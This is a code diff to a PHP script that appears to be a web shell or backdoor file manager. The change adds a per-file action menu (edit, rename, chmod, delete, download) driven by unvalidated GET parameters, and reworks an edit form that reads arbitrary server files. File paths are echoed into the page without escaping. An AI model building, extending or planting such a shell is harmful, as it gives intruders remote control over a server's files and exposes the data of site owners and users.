@@ -51,7 +51,7 @@ table th {
 }
 textarea {
 	padding: 12px 20px;
-	width:94%;
+	width:88%;
 	height:200px;
 	resize:none;
 	-moz-border-bottom-colors: none;
@@ -125,6 +125,9 @@ li.action:hover {
 div.action {
 	width:50%;
 }
+div.action_f {
+	width:50%;
+}
 @media screen and (max-width: 600px) {
   table {
   margin: 0;
@@ -137,6 +140,9 @@ div.action {
 	font-size:10px;
 }
 div.action {
+	width:100%;
+}
+div.action_f {
 	width:100%;
 }
 input[type=text].action {
@@ -296,23 +302,45 @@ if (@$_GET['action'] == 'dir') {
 	<?php
 	exit();
 }
+if (@$_GET['action'] == 'file') {
+	$file = $_GET['file'];
+	?>
+	<thead>
+		<tr>
+			<th>ACTION</th>
+		</tr>
+	</thead>
+	<tr>
+		<td class="not">
+			<center>
+				<div class="action">
+					<input class="action" type="text" name="" value="<?= $file ?>" readonly>
+					<ul class="action">
+						<li class="action"><a href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a></li>
+						<li class="action"><a href="#rename">RENAME</a></li>
+						<li class="action"><a href="#chmod"> CHMOD</a></li>
+						<li class="action"><a href="#delete">DELETE</a></li>
+						<li class="action"><a href="#download">DOWNLOAD</a></li>
+					</ul>
+				</div>
+			</center>
+		</td>
+	</tr>
+	<?php
+	exit();
+}
 if (isset($_GET['edit'])) {
 	$file = $_GET['file'];
 	?>
 		<form method="post" id="login-form" class="modal">
 			<tr>
 				<td class="not">
-					<center>Filename : <?= permission($file, basename($file)) ?></center>
-				</td>
-			</tr>
-			<tr>
-				<td class="not">
-					<textarea name="text"><?= htmlspecialchars(file_get_contents($file)) ?></textarea>
-				</td>
-			</tr>
-			<tr>
-				<td class="not">
-					<input style="width:100%;" type="submit" name="submit">
+					<center>
+					<div class="action_f">
+						Filename : <?= permission($file, basename($file)) ?><br><br>
+						<textarea name="text"><?= htmlspecialchars(file_get_contents($file)) ?></textarea>
+						<input style="width:100%;" type="submit" name="submit">
+					</center>
 				</td>
 			</tr>
 		</form>
@@ -396,7 +424,7 @@ function get_server_info(){
   				</td>
       			<td>
       				<center>
-      					<a href="?path=<?=cwd()?>&edit&file=<?=$files?>">Action</a>
+      					<a href="?path=<?=cwd()?>&action=file&file=<?=$files?>">Action</a>
       				</center>
       			</td>
   			</tr>
@@ -407,7 +435,6 @@ function get_server_info(){
 
 </tbody>
 </table>
-</script>
 </center>
 </body>
 </html>
